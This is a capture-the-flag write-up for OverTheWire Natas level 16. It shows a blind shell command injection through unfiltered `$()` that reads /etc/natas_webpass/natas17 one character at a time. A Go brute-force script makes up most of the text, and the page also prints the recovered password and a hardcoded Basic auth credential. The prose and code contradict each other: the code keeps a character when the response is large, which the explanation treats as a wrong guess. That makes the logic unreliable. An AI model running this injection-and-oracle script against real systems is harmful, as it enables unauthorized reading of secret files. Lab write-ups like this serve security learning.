# 🚩 OverTheWire: Natas Wargame Solutions - Level 16

**Level 16*
read the source code 
we can see that `$()` is not filtered so we can inject command
We can observe from the source code that the command substitution syntax `$()` is not filtered. This allows us to inject shell commands.
We use **grep** to verify characters of the password one by one. The logic relies on the server's response size:

1.  **Injection:** `$(grep ^<guessed_char> /etc/natas_webpass/natas17)`
2.  **If the guess is correct:** The inner grep returns the character. The outer program then searches the dictionary for that character (resulting in a specific filtered output size).
3.  **If the guess is incorrect:** The inner grep returns nothing. The outer program searches for "nothing," which returns the entire dictionary (a predictable large file size).

By automating this check and filtering out the full dictionary response size (461983 bytes), we can reconstruct the password.

password for next level = `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

### Automated Solution (Go)
```golang
package main

import (
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net/http"
	"sync"
)
var (
	client   = &http.Client{
	}
	password = make([]rune, 0, 1000)
	mu       sync.Mutex
)

func main() {
	chars := "abcdefghijklmnopqrstuvwxyz" + // a-z
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +      // A-Z
	"0123456789"                       // 0-9
	// "!@#$%^&*()-_=+[]{}|;:',.<>?/`~" +  // Symbols (optional)
	// " "                                 // Include space if needed
	var wg sync.WaitGroup
	for i := 0; i < 32; i++ {
		ctx, cancel := context.WithCancel(context.Background())
		for _, ch := range chars {
			wg.Add(1)
			go solve(ctx, ch, &wg, cancel)
		}
		wg.Wait()
		fmt.Printf("Progress so far: %s\n", string(password))
	}
	fmt.Printf("Final password: %s\n", string(password))
}

func solve(ctx context.Context, ch rune, wg *sync.WaitGroup, cancel context.CancelFunc) {
	defer wg.Done()
	select {
	case <- ctx.Done():
		return
	default:
	}
	needle := fmt.Sprintf("%%24%%28grep+%%5E%s%s+%%2Fetc%%2Fnatas_webpass%%2Fnatas17%%29&submit=Search", string(password), string(ch)) 
	q := "needle=" + needle
	url := "http://natas16.natas.labs.overthewire.org/?"+q
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		
		fmt.Println(err)
		return
	}

	req.Host = "natas16.natas.labs.overthewire.org"
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate") // Note: The client will handle decompression if needed.
	req.Header.Set("Origin", "http://natas16.natas.labs.overthewire.org")
	req.Header.Set("Authorization", "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", "http://natas16.natas.labs.overthewire.org/")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Priority", "u=0, i")


	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		return
	}
	defer resp.Body.Close()


	var reader io.ReadCloser

	if resp.Header.Get("Content-Encoding") == "gzip" {
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		defer reader.Close()
	} else {
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return
	}
	if len(body) > 400000 {
		mu.Lock()
		password = append(password, ch)
		mu.Unlock()
		cancel()
	}
}
```